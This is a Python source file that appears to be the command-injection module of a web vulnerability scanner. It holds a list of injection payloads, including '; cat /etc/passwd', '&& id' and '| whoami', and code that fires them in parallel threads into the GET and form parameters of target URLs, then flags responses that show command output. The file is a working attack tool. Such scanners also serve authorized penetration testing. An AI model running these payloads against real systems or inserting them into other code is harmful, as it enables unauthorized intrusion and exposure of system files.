from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import requests

class CommandInjection:
    payloads = [
        '&& id',
        '&& whoami',
        '&& uname -a',
        '| id',
        '| whoami',
        '| uname -a',
        '; cat /etc/passwd',
        '| cat /etc/passwd' ,
        'ping -c 4 192.168.56.104'
    ]

    def __init__(self, session, threads=5):
        self.session = session
        self.threads = threads
        self.indicators = [
            'uid=',    
            'gid=',
            'root:',
            'linux',
            'windows',
            'administrator'
        ]

    def extract_params(self, target):
        """
        Extract parameters from a target URL and create the expected parameter structure.
        """
        params = []
        
        # Handle GET parameters from URL
        if '?' in target.get('url', ''):
            base_url, query = target['url'].split('?', 1)
            for param_pair in query.split('&'):
                if '=' in param_pair:
                    name = param_pair.split('=')[0]
                    params.append({
                        'name': name,
                        'type': 'GET'
                    })
            # Update URL to base URL without parameters
            target['url'] = base_url
            
        # Add form parameters if they exist
        if 'form_params' in target:
            for param_name in target['form_params']:
                params.append({
                    'name': param_name,
                    'type': target.get('method', 'POST')
                })
                
        return params

    def filter_targets(self, targets):
        """
        Process targets and ensure they have the required parameter structure.
        """
        processed_targets = []
        for target in targets:
            # If params already exist in correct format, use them
            if 'params' in target and isinstance(target['params'], list):
                processed_targets.append(target)
                continue
                
            # Otherwise, try to extract parameters
            params = self.extract_params(target)
            if params:
                target['params'] = params
                processed_targets.append(target)
                
        return processed_targets

    def test_target(self, target):
        """
        Test a target for command injection vulnerabilities.
        """
        if 'params' not in target or not target['params']:
            return []
            
        results = []
        for param in target['params']:
            for payload in self.payloads:
                try:
                    if param['type'].upper() == 'GET':
                        req = self.session.get(
                            url=target['url'],
                            params={param['name']: payload},
                            timeout=7
                        )
                    else:
                        req = self.session.request(
                            method=param['type'].upper(),
                            url=target['url'],
                            data={param['name']: payload},
                            timeout=7
                        )

                    if req.status_code in [200, 302] and self.detect_vulnerability(req):
                        results.append({
                            'type': 'CMDi',
                            'url': req.url,
                            'param': param['name'],
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target.get('source', 'N/A')
                        })

                except Exception as e:
                    continue
        return results

    def detect_vulnerability(self, response):
        """
        Check if the response contains any known indicators of command execution.
        """
        content = response.text.lower()
        return any(ind.lower() in content for ind in self.indicators)

    def fuzz(self, targets):
        """
        Main entry point: filter targets, then run test_target in parallel threads.
        """
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for Command Injection{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            all_results = []
            for future in futures:
                results = future.result()
                if results:
                    all_results.extend(results)

        return all_results